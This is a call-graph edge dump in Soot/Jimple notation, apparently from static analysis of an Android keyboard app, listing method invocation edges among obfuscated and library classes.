VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(10) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int b(java.lang.Object[],int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r6.<ltc: void <init>(java.lang.String,int,int)>("NONE", 4, 0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int c()> ==> <java.lang.UnsupportedOperationException: void <init>()>
SPECIAL edge: $z0 = specialinvoke r0.<lsn: boolean ac()>() in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: boolean ac()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Language tag type is set to ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(boolean[],boolean[])>($r18, $r19) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(boolean[],boolean[])>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int b(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int b(java.lang.Class)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: boolean hasNext()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r5, $i6, $i1) in <ljf: boolean add(java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: java.lang.Object[] s()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r2.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: boolean add(java.lang.Object)> ==> <java.lang.UnsupportedOperationException: void <init>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljf: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke $r23.<mag: void <init>(java.lang.String,int,int)>("PLAYSTORE_STICKER_IMAGE", 23, 23) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.LinkageError: void <init>()>() in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.LinkageError: void <init>()>
SPECIAL edge: specialinvoke r0.<lka: void <init>()>() in <mii: void <init>()> ==> <lka: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfc: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r2) in <ivv: ivw a()> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r11.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_METADATA", 11, 11) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("iw", "he") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <ljf: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lwa: void <init>()>() in <lwa: void <clinit>()> ==> <lwa: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <ljf: java.lang.Object[] toArray()>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, 0) in <lql: void <clinit>()> ==> <lql: void <init>(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("in", "id") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashMap: void <init>(int,float)>($i0, 1.0F) in <ljd: java.util.Map n(int)> ==> <java.util.LinkedHashMap: void <init>(int,float)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>($r0, $r1, $i0, $r2) in <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i2, $i7) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r3 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int j()> ==> <java.lang.UnsupportedOperationException: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r0.<java.util.List: boolean isEmpty()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: boolean isEmpty()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c2) in <ivw: boolean v(java.lang.String)> ==> <ivw: boolean u(char)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(0) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r3.<java.lang.AssertionError: void <init>(java.lang.Object)>($r1) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(10) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
SPECIAL edge: specialinvoke $r2.<lfc: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfc: void <init>(lfa)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>("unbounded recursion in log statement", r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int a(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int a(java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkt: void e(int)>($i0) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <lkt: void e(int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r7 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r6) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r4.<j$.util.concurrent.v: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.v: void <init>()>
SPECIAL edge: $r12 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r10, $i3) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>($r2, $i1, $i0) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.v: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<java.lang.StringBuilder: void <init>()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r3, "logSiteKey") in <lsn: boolean ac()> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<ltf: void <init>(lto)>($r1) in <lth: void <init>(lto)> ==> <ltf: void <init>(lto)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkt: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void j(int[],int[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(6) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <liz: boolean hasNext()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqm: int size()>
SPECIAL edge: specialinvoke $r2.<lsk: void <init>(java.lang.Class)>(class "Llvt;") in <lsl: void <clinit>()> ==> <lsk: void <init>(java.lang.Class)>
SPECIAL edge: specialinvoke $r5.<java.util.WeakHashMap: void <init>()>() in <hcb: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(5) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int d(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: int d(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
STATIC edge: staticinvoke <java.lang.Thread: void yield()>() in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <java.lang.Thread: void yield()>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("initialized", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<liz: void <init>(ljd)>($r1) in <liw: void <init>(ljd)> ==> <liz: void <init>(ljd)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int c()>() in <ljd: java.util.Map m()> ==> <ljd: int c()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorFeaturedMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<jlu: void <init>(int)>(9) in <lvt: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $l0 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <android.os.SystemClock: long elapsedRealtime()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma g()>() in <lkx: lma q()> ==> <lqq: lma g()>
SPECIAL edge: specialinvoke $r2.<j$.sun.misc.b: void <init>(sun.misc.Unsafe)>($r4) in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: void <init>(sun.misc.Unsafe)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/libs/framework/core/AppBase") in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
CLINIT edge: staticinvoke <jvu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jvu: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object h(int)>($i0) in <ljb: void a()> ==> <ljd: java.lang.Object h(int)>
STATIC edge: $z0 = staticinvoke <lri: boolean V(java.util.List,java.lang.Object)>(r0, $r1) in <lkq: boolean equals(java.lang.Object)> ==> <lri: boolean V(java.util.List,java.lang.Object)>
STATIC edge: $r3 = staticinvoke <lma: lma r(java.lang.Object)>($r5) in <lly: lma g()> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
STATIC edge: staticinvoke <izw: void as(int,java.lang.String)>($i0, "initialCapacity") in <lkg: void <init>(int)> ==> <izw: void as(int,java.lang.String)>
SPECIAL edge: specialinvoke $r20.<mag: void <init>(java.lang.String,int,int)>("NATIVE_CARD", 20, 20) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <lum: lto d(java.lang.String)>($r2) in <lth: lth i(java.lang.String)> ==> <lum: lto d(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke r0.<lsn: lsc c()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsf: lsc c()>
STATIC edge: $r1 = staticinvoke <iwt: java.lang.String d(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <iwt: java.lang.String d(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <ltc: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r6.<lkt: void a(java.lang.Object,java.lang.Object)>($r3, $r11) in <lmb: lme f()> ==> <lkt: void a(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <ljf: void q(int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(short[],short[])>($r6, $r7) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(short[],short[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentMask", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(11) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r15 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<qj: void <init>()>() in <qc: void <init>()> ==> <qj: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.util.Iterator l()>() in <liy: java.util.Iterator iterator()> ==> <ljd: java.util.Iterator l()>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <ljd: void A(int)>
SPECIAL edge: specialinvoke $r1.<lqm: void <init>(lqn)>(r0) in <lqn: lkq f()> ==> <lqm: void <init>(lqn)>
CLINIT edge: staticinvoke <hnc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnc: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(18) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: java.lang.String replace(char,char)>
SPECIAL edge: specialinvoke $r0.<lte: void <init>()>() in <ltf: void <clinit>()> ==> <lte: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r2) in <lwf: void <clinit>()> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_THUMBNAIL", 7, 7) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Object clone()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <lsh: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lme: lma d(java.lang.Object)> ==> <lqq: java.lang.Object get(java.lang.Object)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_UserUnlocked", $r2) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r8.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r0.<lqc: void <init>()>() in <lqc: void <clinit>()> ==> <lqc: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r8, $r3) in <lqs: boolean containsAll(java.util.Collection)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljf: void j(int,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "baseCount") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <coo: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r3 = staticinvoke <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>($r5, $r2) in <lmb: lme f()> ==> <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/LatinApp") in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("stack_size", class "Lltc;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>($r3, r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
SPECIAL edge: specialinvoke r0.<ivv: void <init>()>() in <ivv: void <init>(byte[])> ==> <ivv: void <init>()>
